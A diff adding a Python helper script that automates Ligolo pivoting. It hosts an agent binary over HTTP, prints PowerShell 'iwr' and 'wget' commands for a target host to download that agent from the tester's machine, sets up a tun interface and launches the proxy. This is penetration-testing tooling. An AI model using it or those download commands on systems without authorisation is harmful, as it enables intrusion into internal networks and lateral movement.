@@ -1,0 +1,185 @@
+#!/usr/bin/env python3
+
+import os
+import subprocess
+import signal
+import sys
+import argparse
+import http.server
+import socketserver
+import threading
+import re
+
+# Function to print colored text
+def print_colored(text, color):
+    colors = {
+        "red": "\033[91m",
+        "green": "\033[92m",
+        "yellow": "\033[93m",
+        "reset": "\033[0m"
+    }
+    return f"{colors[color]}{text}{colors['reset']}"
+
+# Function to handle Ctrl+C
+def signal_handler(sig, frame):
+    print("\nShutting down...")
+    sys.exit(0)
+
+# Function to serve the agent.exe using a simple HTTP server
+def serve_agent_exe(directory, port):
+    try:
+        os.chdir(directory)
+        handler = http.server.SimpleHTTPRequestHandler
+        httpd = socketserver.TCPServer(("", port), handler)
+
+        # Hiding the serving message
+        # print(f"Serving agent.exe from {directory} on port {port}...")
+
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\nShutting down agent server...")
+
+# Check if Ligolo interface already exists
+def ligolo_interface_exists():
+    try:
+        subprocess.run("sudo ip link show ligolo", shell=True, check=True, stdout=subprocess.PIPE)
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+# Get the IP address of the tun0 interface
+def get_tun0_ip():
+    try:
+        result = subprocess.run("ip -o -4 addr show tun0", shell=True, check=True, stdout=subprocess.PIPE, text=True)
+        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', result.stdout)
+        if ip_match:
+            return ip_match.group()
+    except subprocess.CalledProcessError:
+        pass
+    return None
+
+# Register the signal handler for Ctrl+C
+signal.signal(signal.SIGINT, signal_handler)
+
+# Get the user's home directory
+home_dir = os.path.expanduser("~")
+
+# Parse command-line arguments
+parser = argparse.ArgumentParser(description="Setup Ligolo and serve agent")
+
+# Add command-line options
+parser.add_argument("-i", "--ip", help="IP address of your Kali machine (Optional)")
+parser.add_argument("-a", "--agent", required=True, help="Absolute path to the agent")
+parser.add_argument("-p","--proxy", required=True, help="Absolute path to the Ligolo proxy")
+parser.add_argument("-P","--port", type=int, help="Port for serving agent OPTIONAL: Default is 8000")
+
+# Print usage instructions 
+usage_instructions = """
+Setup Ligolo and serve agent
+
+Options:
+  -i IP, --ip IP                          IP address of your Kali machine (Optional)
+  -a, --agent /path/to/AGENT,             Absolute path to the agent executable
+  -p, --proxy /path/to/PROXY              Absolute path to the Ligolo proxy binary
+  -P PORT, --port PORT                    Port for serving agent: Default is 8000 (Optional)
+"""
+
+# Print usage instructions if no arguments provided
+if len(sys.argv) == 1:
+    print(usage_instructions)
+    sys.exit(1)
+
+args = parser.parse_args()
+
+# Check if the agent path is absolute
+if not os.path.isabs(args.agent):
+    args.agent = os.path.abspath(args.agent)
+
+# Check if the proxy path is absolute
+if not os.path.isabs(args.proxy):
+    print(print_colored("Error: Absolute path to proxy is required.", "red"))
+    print(usage_instructions)
+    sys.exit(1)
+
+# Attempt to get tun0 IP automatically
+if not args.ip:
+    tun0_ip = get_tun0_ip()
+    if tun0_ip:
+        args.ip = tun0_ip
+    else:
+        args.ip = input("Enter your Kali machine's IP address: ")
+
+# Start a thread to serve agent.exe
+# Use the specified port or default to 8000
+port = args.port if args.port else 8000
+
+server_thread = threading.Thread(target=serve_agent_exe, args=(os.path.dirname(args.agent), port))
+server_thread.daemon = True
+server_thread.start()
+
+# Ligolo instructions
+ligolo_agent_path = args.agent  # Updated with the user-inputted agent path
+
+# Dynamic IP and port based on user's input
+download_ip = args.ip if args.ip else "your_IP_here"  # Replace with the actual IP
+download_port = args.port if args.port else 8000  # Default to 8000 if the port is not specified
+
+# Serving Ligolo agent message
+serving_message = f"# Serving agent on port {download_port}..."
+print(print_colored(serving_message, 'green'))
+
+# Download Ligolo agent commands
+download_commands = [
+    f"{print_colored('# Download Ligolo agent using the following commands:', 'green')}",
+    f"{print_colored('# For Windows (PowerShell):', 'green')} {print_colored(f'iwr -uri http://{download_ip}:{download_port}/agent.exe -outfile agent.exe', 'yellow')}",
+    f"{print_colored('# For Linux (wget):', 'green')} {print_colored(f'wget http://{download_ip}:{download_port}/agent -O agent', 'yellow')}"
+]
+for command in download_commands:
+    print(f"{print_colored(command, 'green')}")
+
+# After downloading instructions
+instructions = [
+    f"{print_colored('# After downloading, execute the following commands:', 'green')}",
+    f"{print_colored('# In Ligolo:', 'green')} {print_colored('session', 'yellow')}",
+    f"{print_colored('# In Ligolo:', 'green')} {print_colored('ifconfig', 'yellow')}",
+    f"{print_colored('# In a separate terminal window:', 'green')} {print_colored(f'sudo ip route add <internal ip>.0/24 dev ligolo', 'yellow')}\n\n"
+]
+
+for instruction in instructions:
+    print(f"{print_colored(instruction, 'green')}")
+
+# Commands to create a tunnel interface for Ligolo
+create_tun_cmd = f"sudo ip tuntap add mode tun user $USER name ligolo"
+set_up_cmd = "sudo ip link set ligolo up"
+
+# Check if Ligolo interface already exists
+if ligolo_interface_exists():
+    print(print_colored("Warning: Ligolo interface 'ligolo' already exists. Skipping creation.", "red"))
+else:
+    try:
+        subprocess.run(create_tun_cmd, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        subprocess.run(set_up_cmd, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        # Check if the exit status is non-zero
+        if e.returncode != 0:
+            error_message = "Tunnel interface 'ligolo' could not be created or set up. Proceeding with caution."
+            print(print_colored("Warning: " + error_message, "red"))
+        else:
+            # Raise the error if it's a different one
+            raise e
+
+# Command: Find the Ligolo proxy binary and execute it
+proxy_cmd = os.path.basename(args.proxy)
+proxy_dir = os.path.dirname(args.proxy)
+
+ligolo_cmd = f"./{proxy_cmd} -selfcert"
+
+try:
+    subprocess.run(ligolo_cmd, shell=True, check=True, cwd=proxy_dir)
+except FileNotFoundError:
+    print(print_colored("Error: Ligolo proxy directory not found. Please provide the absolute path.", "red"))
+    sys.exit(1)
+except subprocess.CalledProcessError as e:
+    print(print_colored(f"Error: {e}", "red"))
+    print("Shutting down...")
+    sys.exit(1)
